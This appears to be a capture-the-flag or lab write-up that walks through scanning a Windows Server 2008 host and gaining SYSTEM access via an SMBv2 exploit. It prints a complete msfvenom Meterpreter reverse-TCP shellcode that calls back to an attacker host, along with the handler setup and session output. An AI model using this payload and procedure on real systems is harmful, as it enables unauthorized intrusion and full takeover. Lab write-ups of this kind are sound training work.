# 6.Internal
## Reconnaissance
### All port scanning
* `nmap -p- -T4 -sS --min-rate 1000 -oN Results_tcp.txt 192.168.149.40`
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-02 12:53 +0530
Nmap scan report for 192.168.149.40
Host is up (0.084s latency).
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
49158/tcp open  unknown
```
#### TCP
* `PORTS=$(grep -E '^[0-9]+/(tcp|udp)' Results_tcp.txt | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//')`<br>
* `nmap -A -p $PORTS -oN targeted_services.txt 192.168.149.40`
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-02 12:56 +0530
Nmap scan report for 192.168.149.40
Host is up (0.13s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
| rdp-ntlm-info:
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2026-09-02T07:27:15+00:00
|_ssl-date: 2026-09-02T07:27:23+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=internal
| Not valid before: 2025-01-05T19:52:51
|_Not valid after:  2025-07-07T19:52:51
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 7|2008|8.1
OS CPE: cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1
OS details: Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1
Network Distance: 4 hops
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
| smb-os-discovery:
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-09-02T00:27:15-07:00
|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:5c:17 (VMware)
| smb2-security-mode:
|   2.0.2:
|_    Message signing enabled but not required
|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s
| smb2-time:
|   date: 2026-09-02T07:27:15
|_  start_date: 2025-02-20T21:30:47
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   185.64 ms 192.168.45.1
2   185.57 ms 192.168.45.254
3   185.66 ms 192.168.251.1
4   185.79 ms 192.168.149.40

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.28 seconds
```
#### UDP
* `nmap -sU -A --top-ports 20 -oN Results_udp.txt 192.168.149.40`
```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-02 12:57 +0530
Nmap scan report for 192.168.149.40
Host is up (0.14s latency).

PORT      STATE         SERVICE      VERSION
53/udp    open          domain       Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   open|filtered ntp
135/udp   closed        msrpc
137/udp   open          netbios-ns   Microsoft Windows netbios-ns (workgroup: WORKGROUP)
| nbns-interfaces:
|   hostname: INTERNAL
|   interfaces:
|_    192.168.149.40
138/udp   open|filtered netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown
Device type: general purpose
Running: Microsoft Windows 2008|2012|7|8.1|Vista, Novell NetWare 6.X
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista cpe:/o:novell:netware:6
Too many fingerprints match this host to give specific OS details
Network Distance: 4 hops
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:5c:17 (VMware)

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   83.09 ms 192.168.45.1
2   82.97 ms 192.168.45.254
3   83.55 ms 192.168.251.1
4   83.66 ms 192.168.149.40

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 164.70 seconds
```
### Web
Trying to connect to Website via the port 5357

![Unavailable](/6.Internal/images/Service_unavailable.png)
```
curl -i http://192.168.149.40:5357
HTTP/1.1 503 Service Unavailable
Content-Type: text/html; charset=us-ascii
Server: Microsoft-HTTPAPI/2.0
Date: Wed, 02 Sep 2026 07:33:30 GMT
Connection: close
Content-Length: 326

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">
<HTML><HEAD><TITLE>Service Unavailable</TITLE>
<META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>
<BODY><h2>Service Unavailable</h2>
<hr><p>HTTP Error 503. The service is unavailable.</p>
</BODY></HTML>
```
Hence no further move on Web can be made.
---
## Exploitation
Now we will try to exploit the services which are present in the target machine i.e (SMB) it's version is 2.

### Using Searchsploit
```
searchsploit smb2
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows - SMB2 Negotiate Protocol '0x72' Response Denial of Service                                                                             | windows/dos/12524.py
Microsoft Windows 10 (1903/1909) - 'SMBGhost' SMB3.1.1 'SMB2_COMPRESSION_CAPABILITIES' Buffer Overflow (PoC)                                              | windows/dos/48216.md
Microsoft Windows 10 (1903/1909) - 'SMBGhost' SMB3.1.1 'SMB2_COMPRESSION_CAPABILITIES' Local Privilege Escalation                                         | windows/local/48267.txt
Microsoft Windows Vista/7 - SMB2.0 Negotiate Protocol Request Remote Blue Screen of Death (MS07-063)                                                      | windows/dos/9594.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
### Using Git-Hub
We found exploit [GitHub_link](https://github.com/jcs3c/SMBv2-Exploit-PrivEsc/blob/main/exploit.py) for this version we need to edit it by creating shellcode using msfvenom and replace the code in [Exploit_file](/6.Internal/sources/exploit.py)
```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.190 LPORT=4444 EXITFUNC=thread -f pyt
hon -v shell
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 376 bytes
Final size of python file: 1933 bytes
shell =  b""
shell += b"\xfc\xe8\x90\x00\x00\x00\x60\x89\xe5\x31\xd2\x64"
shell += b"\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a"
shell += b"\x24\xbf\x7d\xdd\x7c\xac\x8b\x72\x28\x31\xc0\xac"
shell += b"\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
shell += b"\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0"
shell += b"\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x8b\x58\x20"
shell += b"\x01\xd3\x50\x8b\x48\x18\x85\xc9\x74\x3a\x8b\x7d"
shell += b"\xf8\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1\xcf\x0d"
shell += b"\xac\x01\xc7\x38\xe0\x75\xf4\x3b\x7d\x24\x75\xe2"
shell += b"\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58"
shell += b"\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
shell += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
shell += b"\x12\xe9\x7f\xff\xff\xff\x5d\x68\x33\x32\x00\x00"
shell += b"\x68\x77\x73\x32\x5f\x54\x68\x8f\xf4\x6a\x78\x89"
shell += b"\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50"
shell += b"\x68\x07\xaa\x0b\x97\xff\xd5\x6a\x0a\x68\xc0\xa8"
shell += b"\x2d\xbe\x68\x02\x00\x11\x5c\x89\xe6\x50\x50\x50"
shell += b"\x50\x40\x50\x40\x50\x68\xc8\x39\x7f\x77\xff\xd5"
shell += b"\x97\x6a\x10\x56\x57\x68\x6c\x15\x48\x28\xff\xd5"
shell += b"\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00"
shell += b"\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\xed\x42\x3f"
shell += b"\x40\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40"
shell += b"\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x9b\x21\x98"
shell += b"\x56\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\xed"
shell += b"\x42\x3f\x40\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68"
shell += b"\x00\x40\x00\x00\x6a\x00\x50\x68\xb0\xb8\xe3\x0f"
shell += b"\xff\xd5\x57\x68\xc2\x13\x3d\x20\xff\xd5\x5e\x5e"
shell += b"\xff\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff"
shell += b"\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\x56\xd5"
shell += b"\x8a\xeb\x68\x1c\x4d\x1e\x7f\xff\xd5\x3c\x06\x7c"
shell += b"\x0a\x80\xfb\xe0\x75\x05\xbb\x5a\x15\xff\x15\x6a"
shell += b"\x00\x53\xff\xd5"
```
> Changing the exploit file.

### Setting up Shell using msfconsole
```
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.45.190:4444
[*] Sending stage (199238 bytes) to 192.168.149.40
```

* Executing the exploit `python3 exploit.py <target_ip>`

```
[*] Meterpreter session 1 opened (192.168.45.190:4444 -> 192.168.149.40:49159) at 2026-09-02 16:02:58 +0530
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 2720 created.
Channel 1 created.
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
![Proof](/6.Internal/images/Proof.png)
# SOLVED!